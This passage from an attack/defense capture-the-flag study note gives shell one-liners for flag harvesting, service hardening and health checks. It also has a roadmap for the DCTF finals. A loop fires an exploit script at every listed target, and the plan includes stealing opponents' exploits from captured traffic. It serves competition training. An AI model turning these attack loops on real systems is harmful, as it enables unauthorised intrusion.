curl -s https://gameserver/attack.json | jq -r '.services.svc1[].flag_id'
```
🟡 65. self-SLA check (poll like the checker)
```bash
while true; do curl -fsS http://127.0.0.1:5000/health >/dev/null && echo UP || echo DOWN; sleep 10; done
```

## Hardening one-liners
🟡 66. change a service's DB password
```bash
# in the DB: ALTER USER app IDENTIFIED BY '<new>'; then update app config + restart
```
🟡 67. make web root read-only
```bash
chattr +i -R /srv/svc1/static 2>/dev/null || mount -o remount,ro /srv/svc1
```
🟡 68. run service as non-root (systemd)
```bash
# add: [Service]\nUser=svc\n  then systemctl daemon-reload && restart
```
🟡 69. disable an unused (non-SLA) port
```bash
iptables -A INPUT -p tcp --dport 2222 -j DROP
```
🟡 70. rotate a signing key + restart
```bash
openssl rand -hex 32 > /srv/svc1/secret.key && systemctl restart svc1
```

## Misc / glue
🟢 71. count accepted vs rejected (farm log)
```bash
grep -c ACCEPTED farm.log; grep -c REJECTED farm.log
```
🟡 72. extract flags from any text blob
```bash
grep -aoE '[A-Z0-9]{31}=' dump.txt | sort -u
```
🟡 73. time a round (tick) empirically
```bash
# watch when your own flag changes; that interval is the tick
```
🟡 74. fire only at unpatched teams (skip errors fast)
```bash
for ip in $(cat targets.txt); do timeout 6 python3 sploit.py "$ip"; done | sort -u
```
🟡 75. notes/status template
```bash
printf '# A/D status\n| svc | vuln | patched | exploit live |\n|---|---|---|---|\n' > status.md
```


---

## 🗺️ DCTF Roadmap — Attack & Defense

> A/D **is** the DCTF onsite final (recent years on CyberEDU; first hour hardening, then full attack/defense). This roadmap turns the whole doc into a plan. See [[DCTF Finals Playbook]].

### What to study (in order)
1. **Service exploitation breadth** — you must find bugs in web, pwn, and crypto services fast. Drill all three ([[Pwn-Complete]], [[Crypto-Complete]], web basics).
2. **Exploit weaponization** — turn a bug into a parameterized `exploit(ip)->flag`. (techniques G)
3. **Farm + submission** — run DestructiveFarm/S4DFarm end to end. (techniques H–I)
4. **Traffic analysis** — Tulip/Caronte to steal exploits. (techniques J)
5. **Patching under SLA** — minimal fixes that don't break the checker. (techniques K–L)
6. **Defense/monitoring/anti-persistence** — detect and evict. (techniques M–N)
7. **Infra + team process** — roles, comms, automation. (techniques A, O–R)

### How to study
- **Practice the full loop, not pieces.** Stand up FAUST/ForcAD locally and play against yourself: write a service bug, exploit it across "teams," patch it, re-fire.
- **Build your kit now** — farm config, submit client, exploit template, capture scripts — so the event is execution, not setup.
- **Read ENOWARS/saarsec writeups** to see how modern A/D services hide bugs.
- **Everyone on the team learns the farm** — a farm only one person can run is a single point of failure.

### How to exercise
- **ENOWARS / FAUST CTF / saarCTF** — the premier A/D events to train in.
- **Local gameserver drills** — FAUST Gameserver / ForcAD with a toy service.
- Timed drill: from "bug found" to "flag farmed against all teams" in <15 minutes.

### How to do things (event timeline)
1. **H0–H1 hardening:** snapshot, change creds, start capture, baseline SLA. (techniques B)
2. **H1–H3:** vuln-hunt all services in parallel; first exploit to the farm. (C–G)
3. **H3–H6:** automate attacks across all teams; patch found bugs; start stealing exploits from pcap. (H–L, J)
4. **H6–H8:** maximize — keep the farm running, chase a 2nd bug per service, defend aggressively. (M–N)
5. **H8–end:** hold — protect SLA, keep flags flowing, stop risky patches. (Q)

### Golden rules
- **SLA first** — never patch a service into DOWN.
- **Parameterize + loop** — hit every team, every tick.
- **Capture everything** — your pcap is a free exploit feed.
- **Patch what the traffic shows** — the most-exploited endpoint is your top fix.
- **Back up before every patch.** Stay in scope.

> Tags: #ctf #attack-defense #ad #techniques #catalog #scripts #roadmap #dctf
